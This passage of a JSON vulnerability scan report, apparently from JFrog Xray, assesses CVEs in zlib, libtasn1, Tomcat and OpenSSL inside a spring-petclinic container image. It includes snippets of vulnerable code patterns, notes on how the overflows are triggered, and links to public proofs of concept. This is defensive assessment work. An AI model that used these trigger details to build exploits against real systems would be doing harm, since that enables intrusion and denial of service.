            "FullDescription": "[zlib](https://github.com/madler/zlib) is a popular general purpose data compression library.\n\nzlib supports processing gzip archives. As such, it provides the `inflateGetHeader()` method used to get the header information of a gzip archive. The header is always checked for validity, including the header CRC if present. \nWhen the `inflateGetHeader()` is called, it will make the `inflate()` method read and copy the header of a gzip in a structure passed as a parameter to the `inflateGetHeader()` method, otherwise it will discard the header. If the extra header field is big enough, it will cause the `inflate()` method to be called multiple times to get the full content of this extra field. As there is an improper extra field size check, it can cause a heap buffer overflow.\nThe vulnerability can be exploited if and only if the target program calls `inflateGetHeader()`.\nThe attacker should find a remote input that propagates to the `inflate()` method with the `inflateGetHeader()` method being called.\n\nExample:\n```\nz_stream strm;\ngz_header head;\n\nif ((r = inflateInit2(&strm, stream_size)) != Z_OK)\n\tgoto fail;\nif ((r = inflateGetHeader(&strm, &head)) != Z_OK) {\n\tinflateEnd(&strm);\n\tgoto fail;\n}\nr = inflate(&strm, Z_NO_FLUSH);\n```\nThe above code is vulnerable as it is calling the `inflateGetHeader()` method and the `inflate()` method for crafter gzip header.",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Heap overflow leading to code execution",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "PoC demonstrates a heap overflow that crashes the application. Although not demonstrated, it is likely that an RCE exploit could be developed, since gzip-processing may allow many heap-shaping primitives needed for a full RCE exploit.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a way to upload a crafted gzip archive, that is subsequently processed by a `inflate()` call with `inflateGetHeader()` being called before.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OSS-SEC Advisory",
                  "Url": "https://seclists.org/oss-sec/2022/q3/110",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC causing a heap overflow and crashing",
                  "Url": "https://github.com/ivd38/zlib_overflow",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://cgit.freebsd.org/src/commit/sys/contrib/zlib/inflate.c?id=2969066f73fc67a614144ac09b9f3f5291937fed",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:zlib:1.2.11-r3",
            "cve_id": "CVE-2022-37434",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable library zlib is never included",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:zlib:1.2.11-r3",
            "vulnerability_id": "CVE-2022-37434",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-259759",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "GNU Libtasn1 before 4.19.0 has an ETYPE_OK off-by-one array size check that affects asn1_encode_simple_der.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libtasn1",
         "source_id": "alpine://3.14:libtasn1",
         "source_comp_id": "alpine://3.14:libtasn1:4.17.0-r0",
         "component_versions": {
            "id": "3.14:libtasn1",
            "vulnerable_versions": [
               "< 4.17.0-r1"
            ],
            "fixed_versions": [
               "4.17.0-r1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-46848",
                     "cwe": [
                        "CWE-193"
                     ],
                     "cwe_details": {
                        "CWE-193": {
                           "name": "Off-by-one Error",
                           "description": "A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value."
                        }
                     },
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "GNU Libtasn1 before 4.19.0 has an ETYPE_OK off-by-one array size check that affects asn1_encode_simple_der.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-06-04T16:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-259759",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in libtasn1 allows an attacker to perform denial of service by using a public exploit.",
            "FullDescription": "[GNU libtasn](https://www.gnu.org/software/libtasn1/) is a highly portable C library that provides Abstract Syntax Notation One (ASN.1) parsing, encoding, and decoding functions. It is widely used by network and cryptography packages (e.g. GnuTLS).\nlibtasn1 implementation has an improper input validation of ETYPE, in the `ETYPE_OK` macro function. ETYPE is compared against the actual size of the ETYPE array `_asn1_tags_size` instead of `_asn1_tags_size -1` which leads the validation to pass with ETYPE out of range (when `ETYPE = _asn1_tags_size`).\n\n```\n# define ETYPE_OK(etype) (((etype) != ASN1_ETYPE_INVALID && \\\n                          (etype) <= _asn1_tags_size && \\\n                          _asn1_tags[(etype)].desc != NULL)?1:0)\n```\n\nAn attacker can exploit this issue by providing the `_asn1_tags_size` value as the ETYPE value to `ETYPE_OK`, through multiple libtasn1 APIs (as demonstrated in the public exploit). Providing this ETYPE value causes a global buffer overflow (reads 8 bytes outside of a global array) and leads to denial of service in most cases.\n\nThe official solution fixes the bug by comparing ETYPE with `_asn1_tags_size -1` as following:\n```\n(etype) < _asn1_tags_size\n```",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this issue in a server process can cause denial-of-service when it crashes.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A published proof-of-concept is available for this issue.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "In order to exploit this issue an attacker must be able to provide the ETYPE value to the `ETYPE_OK` macro, or at least manipulate it through multiple libtasn1 APIs.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC (Steps to Reproduce)",
                  "Url": "https://gitlab.com/gnutls/libtasn1/-/issues/32",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://gitlab.com/gnutls/libtasn1/-/commit/44a700d2051a666235748970c2df047ff207aeb5#note_1152994262",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libtasn1:4.17.0-r0",
            "cve_id": "CVE-2021-46848",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libtasn1:4.17.0-r0",
            "vulnerability_id": "CVE-2021-46848",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-695198",
         "severity": "Critical",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "maven",
         "summary": "Improper Neutralization of Escape, Meta, or Control Sequences vulnerability in Apache Tomcat. For a subset of unlikely rewrite rule configurations, it was possible \nfor a specially crafted request to bypass some rewrite rules. If those \nrewrite rules effectively enforced security constraints, those \nconstraints could be bypassed.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.5, from 10.1.0-M1 through 10.1.39, from 9.0.0.M1 through 9.0.102.\n\nUsers are recommended to upgrade to version [FIXED_VERSION], which fixes the issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "org.apache.tomcat.embed:tomcat-embed-core",
         "source_id": "gav://org.apache.tomcat.embed:tomcat-embed-core",
         "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
         "component_versions": {
            "id": "org.apache.tomcat.embed:tomcat-embed-core",
            "vulnerable_versions": [
               "10.1.10 ≤ Version < 10.1.40",
               "11.0.0-M2 ≤ Version < 11.0.6",
               "9.0.76 ≤ Version ≤ 9.0.102"
            ],
            "fixed_versions": [
               "10.1.40",
               "11.0.6",
               "9.0.104"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-31651",
                     "cwe": [
                        "CWE-116",
                        "CWE-150"
                     ],
                     "cwe_details": {
                        "CWE-116": {
                           "name": "Improper Encoding or Escaping of Output",
                           "description": "The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved."
                        },
                        "CWE-150": {
                           "name": "Improper Neutralization of Escape, Meta, or Control Sequences",
                           "description": "The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as escape, meta, or control character sequences when they are sent to a downstream component."
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "Improper Neutralization of Escape, Meta, or Control Sequences vulnerability in Apache Tomcat. For a subset of unlikely rewrite rule configurations, it was possible for a specially crafted request to bypass some rewrite rules. If those rewrite rules effectively enforced security constraints, those constraints could be bypassed.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.5, from 10.1.0-M1 through 10.1.39, from 9.0.0.M1 through 9.0.102.\n\nUsers are recommended to upgrade to version 9.0.104, 10.1.40 or 11.0.6, which fix the issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/BOOT-INF/lib/tomcat-embed-core-10.1.34.jar",
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/META-INF/sbom/application.cdx.json/org.springframework.samples:spring-petclinic:3.4.0-SNAPSHOT/gav:/org.apache.tomcat.embed:tomcat-embed-core:10.1.34/org.apache.tomcat.embed:tomcat-embed-core:10.1.34"
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "cve_id": "CVE-2025-31651",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable RewriteRule is never used",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "vulnerability_id": "CVE-2025-31651",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-539878",
         "severity": "Critical",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The openssl (aka node-openssl) NPM package through 2.0.0 was characterized as \"a nonsense wrapper with no real purpose\" by its author, and accepts an opts argument that contains a verb field (used for command execution). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-49210",
                     "cwe": [
                        "CWE-77"
                     ],
                     "cwe_details": {
                        "CWE-77": {
                           "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
                           "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "16"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "The openssl (aka node-openssl) NPM package through 2.0.0 was characterized as \"a nonsense wrapper with no real purpose\" by its author, and accepts an opts argument that contains a verb field (used for command execution). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-49210",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function openssl is never called with external input",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-49210",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-539878",
         "severity": "Critical",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The openssl (aka node-openssl) NPM package through 2.0.0 was characterized as \"a nonsense wrapper with no real purpose\" by its author, and accepts an opts argument that contains a verb field (used for command execution). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-49210",
                     "cwe": [
                        "CWE-77"
                     ],
                     "cwe_details": {
                        "CWE-77": {
                           "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
                           "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "16"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "The openssl (aka node-openssl) NPM package through 2.0.0 was characterized as \"a nonsense wrapper with no real purpose\" by its author, and accepts an opts argument that contains a verb field (used for command execution). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-49210",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function openssl is never called with external input",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-49210",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-183470",
         "severity": "Critical",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the \"out\" parameter can be NULL and, on exit, the \"outlen\" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \"out\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1l-r0"
            ],
            "fixed_versions": [
               "1.1.1l-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-3711",
                     "cwe": [
                        "CWE-120"
                     ],
                     "cwe_details": {
                        "CWE-120": {
                           "name": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')",
                           "description": "The product copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow."
                        }
                     },
                     "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the \"out\" parameter can be NULL and, on exit, the \"outlen\" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \"out\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2021-3711",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2021-3711",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-183470",
         "severity": "Critical",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the \"out\" parameter can be NULL and, on exit, the \"outlen\" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \"out\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1l-r0"
            ],
            "fixed_versions": [
               "1.1.1l-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-3711",
                     "cwe": [
                        "CWE-120"
                     ],
                     "cwe_details": {
                        "CWE-120": {
                           "name": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')",
                           "description": "The product copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow."
                        }
                     },
                     "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the \"out\" parameter can be NULL and, on exit, the \"outlen\" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \"out\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2021-3711",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2021-3711",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-534478",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: A bug has been identified in the processing of key and\ninitialisation vector (IV) lengths.  This can lead to potential truncation\nor overruns during the initialisation of some symmetric ciphers.\n\nImpact summary: A truncation in the IV can result in non-uniqueness,\nwhich could result in loss of confidentiality for some cipher modes.\n\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\nthe key and IV have been established.  Any alterations to the key length,\nvia the \"keylen\" parameter or the IV length, via the \"ivlen\" parameter,\nwithin the OSSL_PARAM array will not take effect as intended, potentially\ncausing truncation or overreading of these values.  The following ciphers\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\n\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\nloss of confidentiality.  For example, when following NIST's SP 800-38D\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\nGCM mode, truncation of the counter portion could lead to IV reuse.\n\nBoth truncations and overruns of the key and overruns of the IV will\nproduce incorrect results and could, in some cases, trigger a memory\nexception.  However, these issues are not currently assessed as security\ncritical.\n\nChanging the key and/or IV lengths is not considered to be a common operation\nand the vulnerable API was recently introduced. Furthermore it is likely that\napplication developers will have spotted this problem during testing since\ndecryption would fail unless both peers in the communication were similarly\nvulnerable. For these reasons we expect the probability of an application being\nvulnerable to this to be quite low. However if an application is vulnerable then\nthis issue is considered very serious. For these reasons we have assessed this\nissue as Moderate severity overall.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.4-r0"
            ],
            "fixed_versions": [
               "3.1.4-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-5363",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "Issue summary: A bug has been identified in the processing of key and\ninitialisation vector (IV) lengths.  This can lead to potential truncation\nor overruns during the initialisation of some symmetric ciphers.\n\nImpact summary: A truncation in the IV can result in non-uniqueness,\nwhich could result in loss of confidentiality for some cipher modes.\n\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\nthe key and IV have been established.  Any alterations to the key length,\nvia the \"keylen\" parameter or the IV length, via the \"ivlen\" parameter,\nwithin the OSSL_PARAM array will not take effect as intended, potentially\ncausing truncation or overreading of these values.  The following ciphers\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\n\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\nloss of confidentiality.  For example, when following NIST's SP 800-38D\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\nGCM mode, truncation of the counter portion could lead to IV reuse.\n\nBoth truncations and overruns of the key and overruns of the IV will\nproduce incorrect results and could, in some cases, trigger a memory\nexception.  However, these issues are not currently assessed as security\ncritical.\n\nChanging the key and/or IV lengths is not considered to be a common operation\nand the vulnerable API was recently introduced. Furthermore it is likely that\napplication developers will have spotted this problem during testing since\ndecryption would fail unless both peers in the communication were similarly\nvulnerable. For these reasons we expect the probability of an application being\nvulnerable to this to be quite low. However if an application is vulnerable then\nthis issue is considered very serious. For these reasons we have assessed this\nissue as Moderate severity overall.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-534478",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in OpenSSL 3.x may lead to data leakage when processing cipher parameters.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nIn cryptography, a block cipher is a symmetric key algorithm that encrypts fixed-size blocks of data, typically 64 or 128 bits, transforming each block into a corresponding ciphertext block using a key-specific permutation.\n\nA major problem with block ciphers, is that equal plaintext blocks get transformed to equal ciphertexts. This can be used for a known-plaintext attack, where an adversary possesses both the plaintext and its corresponding encrypted form, aiming to deduce the encryption key or gain insights into the encryption algorithm.\n\nTo counter this, we use an Initialization vector (IV), which is a random or unique input to a cryptographic algorithm used to alter the first block of the cipher, ensuring equal plaintext blocks won’t be transformed to equal ciphertexts.\n\nA vulnerability was found in OpenSSL 3.x, in certain situations, parameters such as key length or IV length, will be processed after the key and IV have been established, hence they will not take effect as intended, potentially causing truncation or overreading of these values, impacting the confidentiality of the encryption.\n\nWhen calling the functions `EVP_CipherInit_ex2`, `EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` with an `OSSL_PARAM` array, changes to the `keylen` or `ivlen` parameters will only be processed after the IV and the key have been established.\n\nNote this impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
